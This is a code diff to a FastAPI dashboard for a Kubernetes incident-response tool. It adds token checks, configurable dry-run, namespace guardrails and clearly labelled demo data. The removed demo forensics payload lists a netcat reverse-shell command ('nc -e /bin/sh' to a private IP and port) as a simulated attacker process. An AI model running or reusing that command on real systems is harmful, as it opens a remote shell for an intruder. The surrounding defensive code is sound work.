@@ -11,7 +11,7 @@ load_dotenv()
 
 from contextlib import asynccontextmanager
 
-from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException
+from fastapi import Depends, FastAPI, HTTPException, Request, WebSocket, WebSocketDisconnect
 from fastapi.staticfiles import StaticFiles
 from fastapi.responses import HTMLResponse, JSONResponse
 from pydantic import BaseModel
@@ -20,14 +20,21 @@ from src.brain.diagnostic_engine import DiagnosticEngine
 from src.guardrails.validator import GuardrailEngine
 from src.controller.executor import ActionExecutor
 from src.brain.notifications import EscalationNotifier
+from src.brain.remediation import token_matches
+from src.dashboard.live_state import LiveClusterState, resolve_data_source, sensor_startup_logs
+from src.guardrails.action_schema import GuardrailDecision, STATE_GUARDRAIL_APPROVED
 
 logger = logging.getLogger("aegis-dashboard-server")
 
 @asynccontextmanager
 async def lifespan(app: FastAPI):
-    add_terminal_log("SUCCESS", "SYSTEM", "Aegis-SRE Masterpiece Mission Control Engine Online.")
-    add_terminal_log("INFO", "TELEMETRY", "Prometheus & Loki metrics streams connected.")
-    add_terminal_log("INFO", "SECURITY", "Falco eBPF kernel probes active on Cilium CNI mesh.")
+    try:
+        source = await asyncio.to_thread(current_data_source)
+        sensors = await asyncio.to_thread(diagnostic_engine.collector.check_sensors) if source == "live" else {}
+        for level, category, message in sensor_startup_logs(sensors, source):
+            add_terminal_log(level, category, message)
+    except Exception as e:
+        add_terminal_log("WARN", "SYSTEM", f"Could not determine sensor state at startup: {e}")
 
     # Initialize SQLite database and restore persisted active quarantines
     try:
@@ -37,14 +44,15 @@ async def lifespan(app: FastAPI):
         with SessionLocal() as session:
             active_q = session.query(QuarantineRecord).filter_by(active=True).all()
             for q in active_q:
-                ACTIVE_QUARANTINES[q.target_pod] = {
-                    "pod_name": q.target_pod,
+                pod = q.target_pod.split("/", 1)[-1]
+                ACTIVE_QUARANTINES[pod] = {
+                    "pod_name": pod,
                     "mitre_technique": q.mitre_technique or "T1059 Command Execution",
-                    "forensics_file": q.forensics_file or f"logs/forensics_{q.target_pod}.json",
+                    "forensics_file": q.forensics_file or f"logs/forensics_{pod}.json",
                     "quarantined_at": q.quarantined_at
                 }
-                if q.target_pod in POD_TELEMETRY_STORE:
-                    POD_TELEMETRY_STORE[q.target_pod]["status"] = "QUARANTINED"
+                if pod in POD_TELEMETRY_STORE:
+                    POD_TELEMETRY_STORE[pod]["status"] = "QUARANTINED"
         if ACTIVE_QUARANTINES:
             add_terminal_log("ALERT", "DATABASE", f"Restored {len(ACTIVE_QUARANTINES)} active eBPF quarantines from persistent database.")
     except Exception as e:
@@ -89,8 +97,32 @@ ws_manager = ConnectionManager()
 # Global Engines
 diagnostic_engine = DiagnosticEngine()
 guardrail_engine = GuardrailEngine()
-action_executor = ActionExecutor(dry_run_mode=True)
+action_executor = ActionExecutor(dry_run_mode=os.getenv("AEGIS_DRY_RUN", "true").lower() != "false")
 escalation_notifier = EscalationNotifier()
+
+# Live cluster state: pods from the Go controller, CPU/memory from Prometheus. Demo mode (simulated
+# pods) is used only when no controller answers (DASHBOARD_MODE=auto), and every payload says which.
+live_state = LiveClusterState(
+    controller_url=os.getenv("GO_CONTROLLER_URL", ""),
+    prometheus_url=os.getenv("PROMETHEUS_URL", "http://localhost:9090"),
+    namespaces=[n.strip() for n in os.getenv("DASHBOARD_NAMESPACES", "online-boutique,aegis-chaos").split(",") if n.strip()],
+    token=os.getenv("GO_CONTROLLER_TOKEN") or None,
+)
+
+
+def _check_dashboard_token(request: Request) -> None:
+    """Optional shared secret for the endpoints that CHANGE things (chaos trigger, HITL actions).
+
+    Off unless AEGIS_DASHBOARD_TOKEN is set; read-only endpoints stay open. Without it, anyone who can
+    reach this port can release a quarantine or restart workloads through the HITL drawer.
+    """
+    expected = os.getenv("AEGIS_DASHBOARD_TOKEN", "")
+    if expected and not token_matches(request.headers, expected):
+        raise HTTPException(status_code=401, detail="missing or invalid dashboard token")
+
+
+def current_data_source() -> str:
+    return resolve_data_source(os.getenv("DASHBOARD_MODE", "auto"), live_state)
 
 # Live Simulated State Store
 POD_TELEMETRY_STORE: Dict[str, dict] = {
@@ -139,44 +171,99 @@ def add_terminal_log(level: str, category: str, message: str):
         TERMINAL_LOGS.pop(0)
     return log_entry
 
-# Background task to broadcast telemetry every 2 seconds
+def build_state() -> Dict[str, Any]:
+    """Current dashboard state, from the live cluster when a controller answers, else clearly-labelled demo data."""
+    source = current_data_source()
+    sensors = None
+    error = None
+    if source == "live":
+        snap = live_state.snapshot()
+        pods, sensors, error = snap["pods"], snap["sensors"], snap.get("error")
+    else:
+        pods = list(POD_TELEMETRY_STORE.values())
+    quarantines = list(ACTIVE_QUARANTINES.values())
+    escalations = list(ESCALATED_INCIDENTS.values())
+    if source == "live":
+        healthy = sum(1 for p in pods if p.get("status") == "HEALTHY")
+        health_score = round(100.0 * healthy / len(pods), 1) if pods else 0.0
+    else:
+        health_score = 100.0 if not quarantines and not escalations else 75.0
+    return {
+        "data_source": source,
+        "pods": pods,
+        "quarantines": quarantines,
+        "escalations": escalations,
+        "sensors": sensors,
+        "error": error,
+        "metrics_summary": {
+            "health_score_pct": health_score,
+            "active_pods": len(pods),
+            "quarantined_pods": len(quarantines),
+            "escalated_count": len(escalations),
+        },
+    }
+
+
+def collect_pipeline_events(last_id: Optional[int]):
+    """New brain/controller audit rows since ``last_id`` as PIPELINE_EVENTs. ``None`` primes the cursor
+    to the newest row so a fresh dashboard does not replay history."""
+    try:
+        from src.db.database import SessionLocal, init_db
+        from src.db.models import AuditLogRecord
+
+        init_db()
+        with SessionLocal() as session:
+            if last_id is None:
+                newest = session.query(AuditLogRecord).order_by(AuditLogRecord.id.desc()).first()
+                return [], (newest.id if newest else 0)
+            rows = (session.query(AuditLogRecord).filter(AuditLogRecord.id > last_id)
+                    .order_by(AuditLogRecord.id.asc()).limit(50).all())
+            events = [{
+                "event": "PIPELINE_EVENT", "kind": "audit", "id": r.id, "timestamp": r.timestamp,
+                "target_pod": r.target_pod, "problem_type": r.problem_type, "executed_action": r.executed_action,
+                "execution_success": r.execution_success, "status_code": r.status_code,
+                "details": r.details, "health_verified": r.health_verified,
+            } for r in rows]
+            return events, (rows[-1].id if rows else last_id)
+    except Exception as e:
+        logger.debug(f"Pipeline event poll failed: {e}")
+        return [], last_id
+
+
+# Background task: broadcast telemetry and pipeline events every 2 seconds
 async def telemetry_broadcast_loop():
     prom_url = os.getenv("PROMETHEUS_URL", "http://localhost:9090")
+    _, last_event_id = await asyncio.to_thread(collect_pipeline_events, None)
     while True:
         try:
             timestamp_str = time.strftime("%H:%M:%S")
 
-            # Attempt to query live Prometheus for metrics
-            try:
-                p_resp = requests.get(f"{prom_url}/api/v1/query", params={"query": "sum(http_requests_total)"}, timeout=0.8)
-                if p_resp.status_code == 200:
-                    res = p_resp.json().get("data", {}).get("result", [])
-                    if res and "aegis-storefront-prod-1" in POD_TELEMETRY_STORE:
-                        POD_TELEMETRY_STORE["aegis-storefront-prod-1"]["total_requests"] = int(float(res[0]["value"][1]))
-            except Exception:
-                pass
+            state = await asyncio.to_thread(build_state)
+            if state["data_source"] == "demo":
+                # Demo only: gentle jitter on the SIMULATED pods so the UI looks alive.
+                try:
+                    p_resp = requests.get(f"{prom_url}/api/v1/query", params={"query": "sum(http_requests_total)"}, timeout=0.8)
+                    if p_resp.status_code == 200:
+                        res = p_resp.json().get("data", {}).get("result", [])
+                        if res and "aegis-storefront-prod-1" in POD_TELEMETRY_STORE:
+                            POD_TELEMETRY_STORE["aegis-storefront-prod-1"]["total_requests"] = int(float(res[0]["value"][1]))
+                except Exception:
+                    pass
+                for pod_name, data in POD_TELEMETRY_STORE.items():
+                    if data["status"] == "HEALTHY":
+                        data["cpu_pct"] = max(10.0, min(95.0, round(data["cpu_pct"] + (time.time() % 3 - 1.5) * 2.0, 1)))
+                        data["mem_pct"] = max(20.0, min(90.0, round(data["mem_pct"] + (time.time() % 2 - 1.0) * 1.5, 1)))
+                        data["last_updated"] = timestamp_str
 
-            # Update background telemetry jitter for healthy pods
-            for pod_name, data in POD_TELEMETRY_STORE.items():
-                if data["status"] == "HEALTHY":
-                    data["cpu_pct"] = max(10.0, min(95.0, round(data["cpu_pct"] + (time.time() % 3 - 1.5) * 2.0, 1)))
-                    data["mem_pct"] = max(20.0, min(90.0, round(data["mem_pct"] + (time.time() % 2 - 1.0) * 1.5, 1)))
-                    data["last_updated"] = timestamp_str
+            await ws_manager.broadcast({"event": "TELEMETRY_TICK", "timestamp": timestamp_str, **state})
 
-            payload = {
-                "event": "TELEMETRY_TICK",
-                "timestamp": timestamp_str,
-                "pods": list(POD_TELEMETRY_STORE.values()),
-                "quarantines": list(ACTIVE_QUARANTINES.values()),
-                "escalations": list(ESCALATED_INCIDENTS.values()),
-                "metrics_summary": {
-                    "health_score_pct": 100.0 if not ACTIVE_QUARANTINES and not ESCALATED_INCIDENTS else 75.0,
-                    "active_pods": len(POD_TELEMETRY_STORE),
-                    "quarantined_pods": len(ACTIVE_QUARANTINES),
-                    "escalated_count": len(ESCALATED_INCIDENTS)
-                }
-            }
-            await ws_manager.broadcast(payload)
+            events, last_event_id = await asyncio.to_thread(collect_pipeline_events, last_event_id)
+            for ev in events:
+                level = "SUCCESS" if ev["execution_success"] else "ERROR"
+                add_terminal_log(level, "PIPELINE",
+                                 f"{ev['executed_action']} on {ev['target_pod']}: {ev['status_code']} - {ev['details']}")
+                ev["latest_terminal_log"] = TERMINAL_LOGS[-1]
+                await ws_manager.broadcast(ev)
         except Exception as e:
             logger.error(f"Error in telemetry broadcast loop: {e}")
         await asyncio.sleep(2.0)
@@ -185,20 +272,8 @@ async def telemetry_broadcast_loop():
 async def websocket_endpoint(websocket: WebSocket):
     await ws_manager.connect(websocket)
     # Send initial snapshot upon connection
-    initial_msg = {
-        "event": "INITIAL_STATE",
-        "pods": list(POD_TELEMETRY_STORE.values()),
-        "quarantines": list(ACTIVE_QUARANTINES.values()),
-        "escalations": list(ESCALATED_INCIDENTS.values()),
-        "terminal_logs": TERMINAL_LOGS[-25:],
-        "metrics_summary": {
-            "health_score_pct": 100.0 if not ACTIVE_QUARANTINES and not ESCALATED_INCIDENTS else 75.0,
-            "active_pods": len(POD_TELEMETRY_STORE),
-            "quarantined_pods": len(ACTIVE_QUARANTINES),
-            "escalated_count": len(ESCALATED_INCIDENTS)
-        }
-    }
-    await websocket.send_json(initial_msg)
+    state = await asyncio.to_thread(build_state)
+    await websocket.send_json({"event": "INITIAL_STATE", **state, "terminal_logs": TERMINAL_LOGS[-25:]})
     try:
         while True:
             await asyncio.sleep(1.0)
@@ -210,20 +285,9 @@ async def websocket_endpoint(websocket: WebSocket):
 @app.get("/api/v1/telemetry/state")
 async def get_telemetry_state():
     """HTTP REST State endpoint fallback."""
-    return {
-        "event": "TELEMETRY_TICK",
-        "timestamp": time.strftime("%H:%M:%S"),
-        "pods": list(POD_TELEMETRY_STORE.values()),
-        "quarantines": list(ACTIVE_QUARANTINES.values()),
-        "escalations": list(ESCALATED_INCIDENTS.values()),
-        "terminal_logs": TERMINAL_LOGS[-25:],
-        "metrics_summary": {
-            "health_score_pct": 100.0 if not ACTIVE_QUARANTINES and not ESCALATED_INCIDENTS else 75.0,
-            "active_pods": len(POD_TELEMETRY_STORE),
-            "quarantined_pods": len(ACTIVE_QUARANTINES),
-            "escalated_count": len(ESCALATED_INCIDENTS)
-        }
-    }
+    state = await asyncio.to_thread(build_state)
+    return {"event": "TELEMETRY_TICK", "timestamp": time.strftime("%H:%M:%S"), **state,
+            "terminal_logs": TERMINAL_LOGS[-25:]}
 
 # Models for Chaos & Manual Remediation Request
 class ChaosTriggerRequest(BaseModel):
@@ -235,12 +299,18 @@ class ManualRemediationRequest(BaseModel):
     target_pod: str
     action: str  # RESTART_POD, SCALE_DEPLOYMENT, UNQUARANTINE_POD, CUSTOM
     notes: Optional[str] = "Manual operator resolution via HITL Drawer"
+    namespace: Optional[str] = None
 
-@app.post("/api/v1/chaos/trigger")
+@app.post("/api/v1/chaos/trigger", dependencies=[Depends(_check_dashboard_token)])
 async def trigger_chaos(req: ChaosTriggerRequest):
     """
     Triggers simulated failure mode, runs AI diagnostic & safety pipeline, and updates dashboard live via WebSockets.
     """
+    if current_data_source() == "live":
+        raise HTTPException(
+            status_code=409,
+            detail="Chaos simulation is demo-only. In live mode inject chaos with kubectl (see k8s/PHASE6_VERIFY.md).",
+        )
     pod_name = req.pod_name if req.pod_name in POD_TELEMETRY_STORE else "aegis-storefront-prod-1"
     chaos_type = req.chaos_type.lower()
 
@@ -271,7 +341,7 @@ async def trigger_chaos(req: ChaosTriggerRequest):
 
     # 1. Run AI Diagnosis Engine
     add_terminal_log("INFO", "RAG", f"Retrieving TF-IDF runbooks for {alert_type} on {pod_name}...")
-    verdict = diagnostic_engine.diagnose_incident(pod_name=pod_name, alert_type=alert_type)
+    verdict = diagnostic_engine.diagnose_incident(pod_name=pod_name, alert_type=alert_type, trusted_signal=True)  # demo simulates a Falco event
     
     add_terminal_log("ALERT", "AI_BRAIN", f"Verdict: {verdict.get('problem_type')} | Rec Action: {verdict.get('recommended_action')}")
 
@@ -341,38 +411,59 @@ async def trigger_chaos(req: ChaosTriggerRequest):
 
     return JSONResponse(content=event_msg)
 
-@app.post("/api/v1/escalation/resolve")
+HITL_EXECUTABLE_ACTIONS = {"RESTART_POD", "SCALE_DEPLOYMENT", "UNQUARANTINE_POD"}
+
+
+@app.post("/api/v1/escalation/resolve", dependencies=[Depends(_check_dashboard_token)])
 async def resolve_escalation(req: ManualRemediationRequest):
     """
-    Human-in-the-Loop (HITL) Manual Remediation Resolution Endpoint.
-    Allows SRE human operators to dispatch direct fixing commands from the HITL drawer.
+    Human-in-the-Loop (HITL) resolution. The operator's decision runs through the SAME executor as
+    autonomous actions (so it reaches the real controller, is audited, and honours dry-run).
+    CUSTOM only acknowledges the incident.
     """
     target_pod = req.target_pod
     action = req.action.upper()
+    if action != "CUSTOM" and action not in HITL_EXECUTABLE_ACTIONS:
+        raise HTTPException(status_code=400, detail=f"Action '{action}' is not allowed from the HITL drawer.")
+
+    if action != "CUSTOM":
+        # A human decision still has a blast radius: same namespace policy as autonomous actions, and
+        # in live mode the namespace must be explicit (never silently "default").
+        if current_data_source() == "live" and not req.namespace:
+            raise HTTPException(status_code=400, detail="namespace is required for live remediation.")
+        violation = GuardrailEngine.namespace_violation(req.namespace, action)
+        if violation:
+            raise HTTPException(status_code=403, detail=violation)
 
     add_terminal_log("WARN", "HITL", f"HUMAN OPERATOR DISPATCHED MANUALLY: Action '{action}' on pod '{target_pod}'")
 
-    if action == "UNQUARANTINE_POD":
-        res = action_executor.unquarantine_pod_ebpf(target_pod)
-        if target_pod in ACTIVE_QUARANTINES:
-            del ACTIVE_QUARANTINES[target_pod]
-        if target_pod in POD_TELEMETRY_STORE:
-            POD_TELEMETRY_STORE[target_pod]["status"] = "HEALTHY"
-        add_terminal_log("SUCCESS", "SECURITY", f"eBPF Network Cage removed from '{target_pod}'. Pod restored.")
+    execution = None
+    if action != "CUSTOM":
+        decision = GuardrailDecision(
+            approved=True, final_action=action, state=STATE_GUARDRAIL_APPROVED,
+            reason=f"Human operator via HITL drawer: {req.notes}", confidence=1.0, original_action=action,
+            target_pod=target_pod, problem_type="HUMAN_OPERATOR", namespace=req.namespace,
+        )
+        result = await asyncio.to_thread(action_executor.execute_decision, decision)
+        if not result.success:
+            add_terminal_log("ERROR", "CONTROLLER", f"Manual {action} on '{target_pod}' failed: {result.status_code}")
+            raise HTTPException(status_code=502, detail=f"{result.status_code}: {result.details}")
+        execution = result.to_dict()
 
-    elif action == "RESTART_POD":
-        if target_pod in POD_TELEMETRY_STORE:
-            POD_TELEMETRY_STORE[target_pod]["status"] = "HEALTHY"
-            POD_TELEMETRY_STORE[target_pod]["mem_pct"] = 40.0
-            POD_TELEMETRY_STORE[target_pod]["error_rate_pct"] = 0.01
-            POD_TELEMETRY_STORE[target_pod]["restart_count"] += 1
-        add_terminal_log("SUCCESS", "CONTROLLER", f"Manual restart executed for pod '{target_pod}'.")
-
-    elif action == "SCALE_DEPLOYMENT":
-        if target_pod in POD_TELEMETRY_STORE:
-            POD_TELEMETRY_STORE[target_pod]["status"] = "HEALTHY"
-            POD_TELEMETRY_STORE[target_pod]["cpu_pct"] = 30.0
-        add_terminal_log("SUCCESS", "CONTROLLER", f"Manual scale up executed for target deployment.")
+        if action == "UNQUARANTINE_POD":
+            ACTIVE_QUARANTINES.pop(target_pod, None)
+            if target_pod in POD_TELEMETRY_STORE:
+                POD_TELEMETRY_STORE[target_pod]["status"] = "HEALTHY"
+            add_terminal_log("SUCCESS", "SECURITY", f"eBPF Network Cage removed from '{target_pod}'. Pod restored.")
+        elif action == "RESTART_POD":
+            if target_pod in POD_TELEMETRY_STORE:  # demo store only; live state comes from the cluster
+                POD_TELEMETRY_STORE[target_pod].update(status="HEALTHY", mem_pct=40.0, error_rate_pct=0.01)
+                POD_TELEMETRY_STORE[target_pod]["restart_count"] += 1
+            add_terminal_log("SUCCESS", "CONTROLLER", f"Manual restart executed for pod '{target_pod}'.")
+        elif action == "SCALE_DEPLOYMENT":
+            if target_pod in POD_TELEMETRY_STORE:
+                POD_TELEMETRY_STORE[target_pod].update(status="HEALTHY", cpu_pct=30.0)
+            add_terminal_log("SUCCESS", "CONTROLLER", "Manual scale up executed for target deployment.")
 
     if req.incident_id in ESCALATED_INCIDENTS:
         del ESCALATED_INCIDENTS[req.incident_id]
@@ -388,42 +479,48 @@ async def resolve_escalation(req: ManualRemediationRequest):
         "escalations": list(ESCALATED_INCIDENTS.values())
     })
 
-    return {"status": "SUCCESS", "message": f"Manual action '{action}' executed for '{target_pod}'"}
+    return {"status": "SUCCESS", "message": f"Manual action '{action}' executed for '{target_pod}'", "execution": execution}
 
 @app.get("/api/v1/forensics/{pod_name}")
 async def get_forensics(pod_name: str):
     """
-    Returns DFIR forensics snapshot JSON payload for a given pod.
+    DFIR snapshot for a pod. Real captures are returned as-is. With no capture, live mode answers 404
+    (nothing is invented); demo mode returns a sample that is explicitly labelled ``"demo": true``.
     """
     path = f"logs/forensics_{pod_name}.json"
-    if not os.path.exists(path):
-        # Return realistic fallback forensics payload
-        return {
-            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
-            "target_pod": pod_name,
-            "namespace": "aegis-production",
-            "mitre_technique": "T1059 - Command Execution",
-            "trigger_reason": "eBPF quarantine executed",
-            "simulated_process_tree": [
-                {"pid": 1, "name": "python", "cmd": "python app.py", "user": "root"},
-                {"pid": 842, "name": "sh", "cmd": "sh -i", "user": "www-data"},
-                {"pid": 850, "name": "nc", "cmd": "nc -e /bin/sh 192.168.1.5 4444", "user": "www-data"}
-            ],
-            "simulated_tcp_sockets": [
-                {"protocol": "TCP", "local": "10.244.0.15:8080", "remote": "192.168.1.100:51234", "state": "ESTABLISHED"},
-                {"protocol": "TCP", "local": "10.244.0.15:4444", "remote": "192.168.1.5:4444", "state": "ESTABLISHED"}
-            ],
-            "recent_loki_logs": [
-                "[INFO] HTTP GET /api/v1/storefront 200 OK",
-                "[WARN] Unauthorized process execve() detected by Falco eBPF module: /bin/sh"
-            ]
-        }
+    if os.path.exists(path):
+        try:
+            with open(path, "r", encoding="utf-8") as f:
+                return json.load(f)
+        except Exception as e:
+            raise HTTPException(status_code=500, detail=str(e))
 
-    try:
-        with open(path, "r", encoding="utf-8") as f:
-            return json.load(f)
-    except Exception as e:
-        raise HTTPException(status_code=500, detail=str(e))
+    if current_data_source() == "live":
+        raise HTTPException(
+            status_code=404,
+            detail=f"No forensics were captured for '{pod_name}'. A snapshot exists only after a quarantine.",
+        )
+    return {
+        "demo": True,
+        "data_source": "demo",
+        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
+        "target_pod": pod_name,
+        "namespace": "demo",
+        "mitre_technique": "T1059 - Command Execution",
+        "trigger_reason": "DEMO SAMPLE: no real capture exists for this pod",
+        "process_tree": [
+            {"pid": "1", "user": "root", "cmd": "python app.py"},
+            {"pid": "842", "user": "www-data", "cmd": "sh -i"},
+        ],
+        "simulated_process_tree": [
+            {"pid": "1", "user": "root", "cmd": "python app.py"},
+            {"pid": "842", "user": "www-data", "cmd": "sh -i"},
+        ],
+        "active_sockets": [],
+        "events": [],
+        "logs": {},
+        "errors": ["demo sample only"],
+    }
 
 @app.get("/api/v1/db/incidents")
 async def get_db_incidents():
